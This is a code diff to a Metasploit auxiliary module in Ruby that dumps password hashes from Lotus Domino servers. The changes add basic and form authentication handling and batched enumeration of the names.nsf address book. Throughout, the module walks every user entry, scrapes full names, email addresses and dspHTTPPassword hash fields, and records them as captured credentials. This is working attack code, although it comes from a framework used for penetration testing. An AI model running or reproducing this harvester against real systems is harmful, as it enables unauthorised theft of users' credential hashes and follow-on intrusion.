@@ -26,11 +26,13 @@ class Metasploit3 < Msf::Auxiliary
 			'License'        => MSF_LICENSE
 		)
 
-	register_options(
+		register_options(
 		[
 			OptString.new('NOTES_USER', [false, 'The username to authenticate as', '']),
 			OptString.new('NOTES_PASS', [false, 'The password for the specified username' ]),
 			OptString.new('URI', [false, 'Define the path to the names.nsf file', '/names.nsf']),
+			OptInt.new('START_INDEX', [false, 'Index to start at', '1']),
+			OptInt.new('STEP_SIZE', [false, 'Number of records to enumerate at once', '10000']),
 		], self.class)
 
 	end
@@ -39,112 +41,166 @@ class Metasploit3 < Msf::Auxiliary
 
 		user = datastore['NOTES_USER'].to_s
 		pass = datastore['NOTES_PASS'].to_s
-		$uri =  datastore['URI'].to_s
+		uri =  datastore['URI']
 
-		if (user.length == 0 and pass.length == 0)
-			print_status("http://#{vhost}:#{rport} - Lotus Domino - Trying dump password hashes without credentials")
+		formauth = false
+		if user.length != 0
+			begin
+				res = send_request_raw({
+					'method'  => 'GET',
+					'uri'     => "#{uri}"
+				}, 25)
+			rescue
+				print_error("#{msg} Initial connection to test auth failed")
+				return :abort
+			end
+
+			if res and res.code == 401
+				print_status("#{msg} Site appears to use basic authentication")
+				datastore['BasicAuthUser'] = user
+				datastore['BasicAuthPass'] = pass
+			elsif res and res.body =~ /#{Regexp.escape(uri)}\?Login/
+				print_status("#{msg} Site appears to use form authentication")
+				formauth = true
+			else
+				print_error("#{msg} Unrecognized #{res.code} response")
+				return :abort
+			end
+		end
+
+		if formauth
+			print_status("#{msg} Trying to dump password hashes with given credentials")
+			do_login(user, pass, uri)
+
+		else
+			if user.length == 0 and pass.length == 0
+				print_status("#{msg} Trying to dump password hashes without credentials")
+			else
+				print_status("#{msg} Trying to dump password hashes with basic auth credentials")
+			end
 
 			begin
 				res = send_request_raw({
 					'method'  => 'GET',
-					'uri'     => "#{$uri}\/$defaultview?Readviewentries",
+					'uri'     => "#{uri}\/$defaultview?Readviewentries"
 				}, 25)
-
-				if (res and res.body.to_s =~ /\<viewentries/)
-					print_good("http://#{vhost}:#{rport} - Lotus Domino - OK names.nsf accessible without credentials")
-					cookie = ''
-					get_views(cookie,$uri)
-
-				elsif (res and res.body.to_s =~ /names.nsf\?Login/)
-					print_error("http://#{vhost}:#{rport} - Lotus Domino - The remote server requires authentication")
-					return :abort
-
-				else
-					print_error("http://#{vhost}:#{rport} - Lotus Domino - Unrecognized #{res.code} response")
-					print_error(res.inspect)
-					return :abort
-
-				end
-
-				rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
-				rescue ::Timeout::Error, ::Errno::EPIPE
+			rescue
+				print_error("#{msg} Initial connection failed")
+				return
 			end
 
-		else
-			print_status("http://#{vhost}:#{rport} - Lotus Domino - Trying dump password hashes with given credentials")
-			do_login(user, pass)
+			if res and res.body =~ /\<viewentries/
+				print_good("#{msg} OK #{uri} accessible")
+				cookie = ''
+				get_views(cookie,uri)
 
-		end
+			elsif res and res.body =~ /#{Regexp.escape(uri)}\?Login/
+				print_error("#{msg} The remote server requires authentication")
+				return :abort
 
-	end
-
-
-	def do_login(user=nil,pass=nil)
-		post_data = "username=#{Rex::Text.uri_encode(user.to_s)}&password=#{Rex::Text.uri_encode(pass.to_s)}&RedirectTo=%2Fnames.nsf"
-
-		begin
-
-			res = send_request_cgi({
-				'method'  => 'POST',
-				'uri'     => '/names.nsf?Login',
-				'data'    => post_data,
-			}, 20)
-
-			if (res and res.code == 302 )
-				if res.headers['Set-Cookie'] and res.headers['Set-Cookie'].match(/DomAuthSessId=(.*);(.*)/i)
-					cookie = "DomAuthSessId=#{$1}"
-				elsif res.headers['Set-Cookie'] and res.headers['Set-Cookie'].match(/LtpaToken=(.*);(.*)/i)
-					cookie = "LtpaToken=#{$1}"
+			elsif res and res.code == 401
+				if user.length == 0 and pass.length == 0
+					print_error("#{msg} The remote server requires basic authentication")
 				else
-					print_error("http://#{vhost}:#{rport} - Lotus Domino - Unrecognized 302 response")
-					return :abort
+					print_error("#{msg} Basic authentication failed")
 				end
-				print_good("http://#{vhost}:#{rport} - Lotus Domino - SUCCESSFUL authentication for '#{user}'")
-				print_status("http://#{vhost}:#{rport} - Lotus Domino - Getting password hashes")
-				get_views(cookie,$uri)
-
-			elsif (res and res.body.to_s =~ /names.nsf\?Login/)
-					print_error("http://#{vhost}:#{rport} - Lotus Domino - Authentication error: failed to login as '#{user}'")
-					return :abort
-
+				return :abort
 			else
-				print_error("http://#{vhost}:#{rport} - Lotus Domino - Unrecognized #{res.code} response")
+				print_error("#{msg} Unrecognized #{res.code} response")
 				return :abort
 			end
+		end
+	end
 
-			rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
-			rescue ::Timeout::Error, ::Errno::EPIPE
+	def do_login(user=nil,pass=nil,uri)
+		post_data = "username=#{Rex::Text.uri_encode(user.to_s)}&password=#{Rex::Text.uri_encode(pass.to_s)}&RedirectTo=#{uri}"
+
+		begin
+			res = send_request_cgi({
+				'method'  => 'POST',
+				'uri'     => "#{uri}?Login",
+				'data'    => post_data
+			}, 20)
+		rescue
+			print_error("#{msg} Login connection failed")
+			return
 		end
 
+		if res and res.code == 302
+			if res.headers['Set-Cookie'] and res.headers['Set-Cookie'].match(/DomAuthSessId=(.*);(.*)/i)
+				cookie = "DomAuthSessId=#{$1}"
+			elsif res.headers['Set-Cookie'] and res.headers['Set-Cookie'].match(/LtpaToken=(.*);(.*)/i)
+				cookie = "LtpaToken=#{$1}"
+			else
+				print_error("#{msg} Unrecognized 302 response")
+				return :abort
+			end
+			print_good("#{msg} SUCCESSFUL authentication for '#{user}'")
+			print_status("#{msg} Getting password hashes")
+			get_views(cookie,uri)
+
+		elsif res and res.body =~ /#{Regexp.escape(uri)}\?Login/
+			print_error("#{msg} Authentication error: failed to login as '#{user}'")
+			return :abort
+		else
+			print_error("#{msg} Unrecognized #{res.code} response")
+			return :abort
+		end
 	end
 
 	def get_views(cookie,uri)
+
+		start = datastore['START_INDEX']
+		step = datastore['STEP_SIZE']
 
 		begin
 			res = send_request_raw({
 				'method'  => 'GET',
 				'uri'     => "#{uri}\/$defaultview?Readviewentries",
-				'cookie'  => cookie,
+				'cookie'  => cookie
 			}, 25)
-			if (res and res.body)
-				max = res.body.scan(/siblings=\"(.*)\"/)[0].join
+		rescue
+			print_error("#{msg} Request to enumerate entries failed")
+			return
+		end
 
-				1.upto(max.to_i) {|i|
-					res = send_request_raw({
-						'method'  => 'GET',
-						'uri'     => "#{uri}\/$defaultview?Readviewentries&Start=#{i}",
-						'cookie'  => cookie,
-					}, 25)
+		if !res or !res.body
+			print_error("#{msg} Request to enumerate entries failed")
+			return
+		end
 
-				viewId = res.body.scan(/unid="([^\s]+)"/)[0].join
-				dump_hashes(viewId,cookie,uri)
-				}
+		max = res.body.scan(/siblings=\"(.*)\"/)[0].join
 
+		print_good("#{msg} #{max} potential accounts found")
+
+		(start .. max.to_i).step(step) do |i|
+			begin
+				res = send_request_raw({
+					'method'  => 'GET',
+					'uri'     => "#{uri}\/$defaultview?Readviewentries&Start=#{i}&Count=#{step}",
+					'cookie'  => cookie
+				}, 25)
+			rescue
+				print_error("#{msg} Request for batch of users starting at #{i} failed, stopping dump. Use START_INDEX to resume the dump")
+				return
 			end
 
-			rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
-			rescue ::Timeout::Error, ::Errno::EPIPE
+			if !res or !res.body
+				print_error("#{msg} Request for batch of users starting at #{i} failed, stopping dump. Use START_INDEX to resume the dump")
+				return
+			end
+
+			current = i
+			res.body.scan(/unid="([^\s]+)"/) do |viewId|
+				current = current + 1
+				if dump_hashes(viewId[0],cookie,uri) == -1
+					print_error("#{msg} Request for entry #{current} failed, stopping dump. Use START_INDEX to resume the dump")
+					return
+				end
+			end
 		end
+
+		print_good("#{msg} All accounts successfully dumped")
 	end
 
 	def dump_hashes(view_id,cookie,uri)
@@ -153,51 +209,61 @@ class Metasploit3 < Msf::Auxiliary
 			res = send_request_raw({
 				'method'  => 'GET',
 				'uri'     => "#{uri}\/$defaultview/#{view_id}?OpenDocument",
-				'cookie'  => cookie,
+				'cookie'  => cookie
 			}, 25)
-
-			if (res and res.body)
-				short_name = res.body.scan(/<INPUT NAME=\"ShortName\" TYPE=(?:.*) VALUE=\"([^\s]+)"/i).join
-				user_mail = res.body.scan(/<INPUT NAME=\"InternetAddress\" TYPE=(?:.*) VALUE=\"([^\s]+)"/i).join
-				pass_hash = res.body.scan(/<INPUT NAME=\"dspHTTPPassword\" TYPE=(?:.*) VALUE=\"([^\s]+)"/i).join
-
-				if short_name.to_s.strip.empty?
-					short_name = 'NULL'
-				end
-
-				if user_mail.to_s.strip.empty?
-					user_mail = 'NULL'
-				end
-
-				if pass_hash.to_s.strip.empty?
-					pass_hash = 'NULL'
-				end
-
-				print_good("http://#{vhost}:#{rport} - Lotus Domino - Account Found: #{short_name}, #{user_mail}, #{pass_hash}")
-
-				if pass_hash != 'NULL'
-					domino_svc = report_service(
-						:host => rhost,
-						:port => rport,
-						:name => "http"
-					)
-					report_auth_info(
-						:host        => rhost,
-						:port        => rport,
-						:sname       => (ssl ? "https" : "http"),
-						:user        => short_name,
-						:pass        => pass_hash,
-						:ptype       => "domino_hash",
-						:source_id => domino_svc.id,
-						:source_type => "service",
-						:proof       => "WEBAPP=\"Lotus Domino\", USER_MAIL=#{user_mail}, HASH=#{pass_hash}, VHOST=#{vhost}",
-						:active      => true
-					)
-				end
-			end
-
-			rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
-			rescue ::Timeout::Error, ::Errno::EPIPE
+		rescue
+			return -1
 		end
+
+		if !res or !res.body
+			return -1
+		end
+
+		full_name = res.body.scan(/<INPUT NAME=\"FullName\" TYPE=(?:.*) VALUE=\"(.*?)"/i).join
+		user_mail = res.body.scan(/<INPUT NAME=\"InternetAddress\" TYPE=(?:.*) VALUE=\"([^\s]+)"/i).join
+		pass_hash = res.body.scan(/<INPUT NAME=\"dspHTTPPassword\" TYPE=(?:.*) VALUE=\"([^\s]+)"/i).join
+
+		if full_name.strip.empty?
+			full_name = nil
+		end
+
+		if user_mail.strip.empty?
+			user_mail = nil
+		end
+
+		if pass_hash.strip.empty?
+			pass_hash = nil
+		end
+
+		if pass_hash
+			print_good("#{msg} Account Found: #{full_name}, #{user_mail}, #{pass_hash}")
+
+			domino_svc = report_service(
+				:host => rhost,
+				:port => rport,
+				:name => (ssl ? "https" : "http")
+			)
+
+			report_auth_info(
+				:host        => rhost,
+				:port        => rport,
+				:sname       => (ssl ? "https" : "http"),
+				:user        => full_name,
+				:pass        => pass_hash,
+				:ptype       => "domino_hash",
+				:source_id   => (domino_svc ? domino_svc.id : nil),
+				:source_type => "service",
+				:proof       => "WEBAPP=\"Lotus Domino\", USER_MAIL=#{user_mail}, HASH=#{pass_hash}, VHOST=#{vhost}",
+				:active      => true
+			)
+		end
+
+		return 1
 	end
+
+	def msg
+		proto = ssl ? "https" : "http"
+		"#{proto}://#{vhost}:#{rport} - Lotus Domino -"
+	end
+
 end
